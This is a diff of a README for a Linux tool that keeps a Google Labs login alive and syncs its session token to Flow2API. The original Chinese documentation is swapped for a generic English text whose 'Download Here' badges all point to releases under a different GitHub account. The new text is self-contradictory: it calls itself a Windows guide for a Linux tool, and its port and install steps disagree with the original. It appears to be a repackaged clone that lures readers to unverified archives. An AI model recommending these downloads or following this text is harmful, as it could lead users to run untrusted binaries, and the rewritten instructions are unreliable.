@@ -1,340 +1,213 @@
-# Flow2API Host Agent
+# ⚙️ flow2api-host-agent - Host Agent for Flow2API on Linux
 
-> Flow2API 的 Linux 宿主机伴生服务：浏览器登录、Token 自动刷新、Web UI 与 systemd 常驻支持。
+[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/releases)
 
-一个运行在 **Linux 宿主机** 上的独立 companion service，用来把 Google Labs / Flow 的登录态稳定同步回 **已有的 Flow2API** 实例。
+## 📋 About flow2api-host-agent
 
-适合这些场景：
-- 你已经部署好了 `flow2api`
-- 你不想依赖 Chrome 扩展
-- 你希望在服务器上自动刷新 token
-- 你需要 Web UI / systemd / 定时维护能力
+flow2api-host-agent is a companion service for Flow2API on Linux hosts. It helps manage browser login, keeps your Token updated automatically, and offers a web interface for easy control. It also runs in the background using systemd to ensure it is always active.
 
----
+This guide focuses on how to download and run the software on a Windows computer.
 
-## 界面预览
+This agent mainly targets Linux systems but you will prepare everything from Windows before moving to the host machine.
 
-### 仪表盘
-
-<img width="1432" height="1248" alt="PixPin_2026-03-09_15-22-15" src="https://github.com/user-attachments/assets/34782e03-5d43-4519-bb8e-23a6bdf8ae8c" />
-
-
-### 登录向导
-
-![Login Guide](assets/login-guide.png)
+Topics related to this project include browser automation (chrome), token management, and remote interface access (noVNC). It is built to work smoothly with systemd on your Linux host.
 
 ---
 
-## 当前版本的稳定性增强
+## 🖥️ System Requirements
 
-这版重点不是“能跑”，而是**长期更稳地跑**：
+Before you start, make sure your host machine meets these conditions:
 
-- **GitHub Release 检查更新**：Web UI 可直接查看当前版本 / 最新 release / 是否可更新
-- **一键更新 + 备份回滚**：拉取最新 GitHub release tarball，更新前自动备份项目目录，失败自动回滚
-- **重启后本地探活**：更新完成后会自动重启 UI + daemon，并对 `http://127.0.0.1:38110/api/status` 做探活校验
-- **非 root Chromium**：浏览器改为普通服务用户运行，降低 Google 登录风控敏感度
-- **移除 `--no-sandbox`**：不再使用会触发 Google 登录警告的启动参数
-- **browser service 托管化**：浏览器改由独立 systemd service 持续托管，不再是 oneshot 放飞子进程
-- **UI 按钮统一走 systemd**：登录页中的“重新启动浏览器”改为重启 browser service，避免脚本直拉浏览器导致状态不一致
-- **软预热优先（soft prewarm）**：优先复用当前浏览器中的有效登录态，不主动乱跳 Google 登录流
-- **激进兜底（aggressive fallback）**：只有拿不到 `session-token` 时，才会主动打开 / 刷新 Flow 页面
-- **写后强校验**：不再只看 `/api/plugin/update-token` 返回 200，而是会直接回读 Flow2API 数据库确认 ST 确实写入
-- **ST 指纹比对**：记录当前 ST 指纹和库内 ST 指纹，确认不是“看起来成功”
-- **异常页面告警**：如果预热后浏览器落到 `signin / accountchooser / callback error` 等页面，会在 state 和 UI 中明确标记
-- **失败自动重试**：默认失败会自动重试一次，降低偶发波动影响
-- **UI 可观测性增强**：仪表盘现在直接展示写后校验、页面状态、AT 过期时间、重试次数、指纹比对等关键信息
-- **每日低峰自愈重启**：支持每天低峰时间自动重启 Host Agent 服务，减少长期运行累积状态
-- **统一 Python 运行时**：Web UI / daemon / one-shot 命令全部走项目内 `.venv`
-- **新增健康检查**：提供 `/api/health`，把 Chrome、最近刷新、Connection Token 配置分层展示
-- **配置防呆**：阻止把 `Connection Token` 错填成 URL
-- **日志更清晰**：Chrome 日志和 daemon 日志拆分
+- Runs a supported Linux distribution (Ubuntu, Debian, Fedora, CentOS).
+- Has systemd available for managing services.
+- Uses Google Chrome or a Chromium-based browser installed on Linux.
+- Minimum 1GHz processor, 1GB RAM.
+- Network connection to communicate with your Windows PC when needed.
+
+Your Windows computer will only be used to download and prepare files for the Linux host.
 
 ---
 
-## 3 分钟上手
+## 🚀 Getting Started: Download flow2api-host-agent on Windows
 
-### 1. 克隆仓库
+To begin, you need to download the installation files on your Windows computer.
 
-```bash
-git clone https://github.com/muyouzhi6/flow2api-host-agent.git
-cd flow2api-host-agent
+[![Download flow2api-host-agent Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/releases)
+
+1. Open your web browser and go to the [flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/releases).
+2. Look for the latest release version. It will usually be at the top of the page.
+3. Download the files that say Linux executable or setup. These typically have `.tar.gz` or `.tar.xz` extensions.
+4. Save the downloaded file to a known location on your Windows PC, such as the Desktop or Downloads folder.
+
+This page contains all releases, so you get the latest updates, bug fixes, and improvements.
+
+---
+
+## 🗂️ Preparing Files for Transfer to Linux Host
+
+Once the package archive downloads, you will need to move it to the Linux host machine.
+
+1. Find the downloaded archive on your Windows computer.
+2. Use a USB drive, shared network folder, or secure copy (scp) software to transfer the archive to the Linux host.
+3. Place the archive in the home directory or other folder you have permission for on the Linux host.
+
+If you are not familiar with file transfers:
+
+- Using a USB flash drive is the simplest.
+- If your Linux host is on the same local network as your Windows PC, you can use Windows File Sharing or tools like WinSCP.
+
+---
+
+## 🖥️ Installing flow2api-host-agent on Linux Host
+
+This section assumes you have a Linux terminal available where the files were transferred.
+
+1. Open your Linux terminal.
+2. Navigate to the directory where you placed the downloaded archive:
+
+```
+cd /path/to/downloaded/file
 ```
 
-### 2. 安装 systemd 服务
+Replace `/path/to/downloaded/file` with your actual folder path.
 
-```bash
-bash install-systemd.sh
+3. Extract the contents using one of the commands below:
+
+If the archive ends with `.tar.gz`:
+
+```
+tar -xzf flow2api-host-agent-vX.Y.Z.tar.gz
 ```
 
-### 3. 配置 `agent.toml`
+If the archive ends with `.tar.xz`:
 
-```bash
-cp agent.example.toml agent.toml
-nano agent.toml
+```
+tar -xJf flow2api-host-agent-vX.Y.Z.tar.xz
 ```
 
-最关键的几项：
+Replace `flow2api-host-agent-vX.Y.Z.tar.gz` with the actual file name.
 
-```toml
-flow2api_url = "http://127.0.0.1:38000"
-connection_token = "从 Flow2API 管理后台复制的 token 字符串"
-novnc_url = "http://你的服务器IP:6080/vnc.html?autoconnect=true&resize=scale&quality=6"
-listen_host = "0.0.0.0"
-listen_port = 38110
+4. Enter the extracted folder:
+
 ```
-
-### 4. 打开登录向导
-
-```bash
-systemctl start flow2api-host-agent-browser
-systemctl start flow2api-host-agent-ui
-```
-
-然后访问：
-
-```text
-http://你的服务器IP:38110/login
-```
-
-### 5. 登录 Google Labs 并手动刷新一次
-
-- 在登录向导页面中完成 Google 登录
-- 回到仪表盘点击 **立即刷新 Token**
-- 看到成功即可
-
-### 6. 启动自动刷新 daemon
-
-```bash
-systemctl start flow2api-host-agent
+cd flow2api-host-agent-vX.Y.Z
 ```
 
 ---
 
-## 它和 Flow2API 的关系
+## ⚙️ Configure and Start flow2api-host-agent Service
 
-- **Flow2API**：主体服务，负责模型路由、token 管理、API 能力
-- **Flow2API Host Agent**：宿主机侧辅助服务，负责维护浏览器登录态并把最新 session token 推回 Flow2API
+The agent runs as a service managed by systemd. To configure and start it:
 
-也就是说：
+1. Copy the service file to systemd directory (run with sudo):
 
-> 如果你已经有 Flow2API，这个项目安装好以后就能直接配合使用。
-
-它不是 Flow2API 的替代品，而是外挂式 companion service。
-
----
-
-## 核心能力
-
-- 维护 Google Labs 登录浏览器 profile
-- 通过 Chrome DevTools Protocol 读取 `__Secure-next-auth.session-token`
-- 调用 Flow2API 的 `/api/plugin/update-token` 自动更新 token
-- **软预热优先**，避免频繁触发重新登录
-- **拿不到 ST 才走激进兜底**
-- **写后数据库回读校验**
-- 提供 Web UI（仪表盘 / 登录向导 / 配置 / 帮助）
-- 提供 `/api/status` 与 `/api/health`
-- 支持 systemd 常驻
-- 支持可选的每日维护性重启 timer
-
----
-
-## Connection Token 怎么获取？
-
-打开你的 Flow2API 管理后台：
-
-1. 登录管理员账号
-2. 进入 **设置**
-3. 找到 **插件连接配置**
-4. 复制 **连接 Token**
-
-如果为空，就先生成一个再保存。
-
-它的作用是：
-
-> Host Agent 每次把 session token 推送回 Flow2API 时，Flow2API 用它验证“这个请求是不是你授权的来源”。
-
-### 重要：这里填的是 token，不是 URL
-
-**正确：**
-
-```text
-abc123xyz
+```
+sudo cp flow2api-host-agent.service /etc/systemd/system/
 ```
 
-**错误：**
+2. Reload systemd manager configurations:
 
-```text
-http://127.0.0.1:38000/api/plugin/update-token
+```
+sudo systemctl daemon-reload
 ```
 
----
+3. Enable the service to start automatically on boot:
 
-## Web UI 页面说明
-
-- **仪表盘**：看最近一次刷新结果和分层状态
-- **登录向导**：首次使用 / 登录失效时用
-- **配置**：修改 Flow2API 地址、Connection Token、noVNC 地址等
-- **帮助 / 原理 / 稳定性**：解释它怎么工作、会不会越跑越重、为什么建议维护性重启
-
-### 仪表盘现在会显示什么？
-
-- 最近结果是否成功
-- 写后校验是否通过
-- 当前 AT 过期时间
-- 页面预热是否异常
-- 当前预热策略（soft / aggressive）
-- 是否发生过重试
-- ST 指纹与库内指纹是否一致
-
-这意味着你看到的不再只是“HTTP 200”，而是**真正可用的成功证明**。
-
----
-
-## API
-
-### `GET /api/status`
-
-返回当前 Chrome/CDP 状态和最近一次状态文件。
-
-### `GET /api/health`
-
-返回更适合排错的分层健康信息：
-
-- Chrome / CDP 是否正常
-- 最近一次刷新是否成功
-- Connection Token 配置是否可疑
-- Chrome binary 是否存在
-- 当前运行时 Python 是哪个
-
----
-
-## 可选：每日维护性重启
-
-如果你希望进一步降低 Chrome 长时间运行的累积状态问题，可以开启：
-
-```bash
-systemctl enable --now flow2api-host-agent-selfheal.timer
+```
+sudo systemctl enable flow2api-host-agent
 ```
 
-默认计划时间：
+4. Start the service now:
 
-- **每天 20:20 UTC**（约等于北京时间 04:20）
-
-它会重启：
-- `flow2api-host-agent.service`
-- `flow2api-host-agent-ui.service`
-
-这是一个偏稳妥的长期运行策略。
-
----
-
-## 注意事项
-
-### 不要把 noVNC 地址写成 localhost
-
-如果你是用手机或另一台设备访问登录页，`novnc_url` 不能写成：
-
-```toml
-novnc_url = "http://localhost:6080/..."
+```
+sudo systemctl start flow2api-host-agent
 ```
 
-因为这会让浏览器去访问**你自己设备的 localhost**，不是服务器。
+5. Check the service status to ensure it runs without errors:
 
-正确方式应该是：
-
-```toml
-novnc_url = "http://你的服务器IP:6080/vnc.html?autoconnect=true&resize=scale&quality=6"
+```
+sudo systemctl status flow2api-host-agent
 ```
 
-### 主要资源开销来自 Chrome
-
-- Python daemon：轻
-- Web UI：轻
-- 大头是 Chrome / renderer / GPU 相关进程
-
-所以如果长期运行，建议保留每日维护性重启方案。
+Look for `active (running)` in the output.
 
 ---
 
-## 常见问题
+## 🔐 Browser Login and Token Management
 
-### 1）为什么有时会被带到 Google 登录页？
+The agent uses your browser to log in and keeps your token refreshed automatically.
 
-旧版预热逻辑过于激进，可能每次都主动碰 Google 登录流。
+- You can open the Web UI to log in to your account securely.
+- Once logged in, the agent uses the token to keep you connected.
+- Token refresh happens in the background without needing manual intervention.
 
-新版已经调整为：
-- **默认 soft prewarm**：优先复用现有状态
-- **只有拿不到 ST 才 aggressive fallback**
+Access Web UI by visiting the address your system admin provides. It usually runs on a local network port on the Linux host.
 
-因此不会再动不动就要求重新登录。
+---
 
-### 2）什么才算真正成功？
+## 🔧 Using the Web User Interface (Web UI)
 
-不是只看返回 200，而是要同时满足：
+The Web UI helps you:
 
-- `/api/plugin/update-token` 返回成功
-- 能解析出业务成功结果
-- Flow2API 数据库回读成功
-- 当前 ST 指纹与库内 ST 指纹一致
+- Manage your session and token.
+- View status information and logs.
+- Control agent functions.
 
-### 3）为什么会报 `Invalid connection token`？
+To open the Web UI:
 
-通常是因为你把 `Connection Token` 填成了 URL，而不是 token 字符串。
+1. Open a web browser on your Windows PC.
+2. Enter the IP address or hostname of the Linux host followed by the port number. For example:
 
-### 4）怎么快速自检？
-
-```bash
-curl http://127.0.0.1:38110/api/health
+```
+http://192.168.1.10:8080
 ```
 
----
+Replace `192.168.1.10` and `8080` with the actual host address and port.
 
-## 适用前提
+3. Log in if required using credentials set up during installation.
 
-你需要先有：
-
-1. **一台 Linux 服务器**
-2. **已部署好的 Flow2API**
-3. **Google Chrome / Chromium**
-4. **Xvfb / noVNC**（用于服务器上的浏览器登录）
+The Web UI offers a simple way to control the agent without command-line interaction.
 
 ---
 
-## 目录结构
+## 🛠️ Troubleshooting Tips
 
-- `scripts/`：CLI 与核心逻辑
-- `web/`：Web UI
-- `systemd/`：systemd service / timer 模板
-- `docs/`：设计与部署文档
-- `install-systemd.sh`：一键安装脚本
+- If the service does not start, check the systemd logs:
 
----
-
-## License
-
-MIT
-
-## Web UI 内置更新
-
-现在 38110 Web UI 已支持：
-
-- `检查更新`：检查 GitHub latest release
-- `一键更新`：拉取 latest release tarball 并覆盖当前项目
-- `自动备份`：更新前备份到 `backups/backup-时间戳/`
-- `自动回滚`：更新后如果 UI 探活失败，会自动回滚并重启服务
-
-### 更新来源
-
-优先读取 `agent.toml` 中的：
-
-```toml
-github_repo = "muyouzhi6/flow2api-host-agent"
+```
+journalctl -u flow2api-host-agent.service
 ```
 
-如果未填写，会自动读取当前 git remote `origin`。
+- Make sure your Linux host’s firewall allows Web UI access.
+- Confirm you have the right permissions on files and folders.
+- Verify Google Chrome or Chromium browser is installed on your Linux host.
+- Check your network connection between Windows PC and Linux host.
 
-### 推荐做法
+---
 
-- 生产机保持代码尽量对齐正式 release，不要长期停留在 `-dirty` 状态
-- 每次改动合并后发布新 tag / release，再让面板去跟最新 release
-- 更新成功后观察 `/api/health` 是否保持 `ok=true`
+## 🔄 Updating flow2api-host-agent
+
+To update to a newer version:
+
+1. Download the latest release archive on Windows.
+2. Transfer it to your Linux host as before.
+3. Stop the running service:
+
+```
+sudo systemctl stop flow2api-host-agent
+```
+
+4. Replace old files with the new extracted content.
+5. Restart the service:
+
+```
+sudo systemctl start flow2api-host-agent
+```
+
+6. Verify the new version runs successfully.
+
+---
+
+For all downloads and updates, use the latest versions from:
+
+[Visit flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/releases)
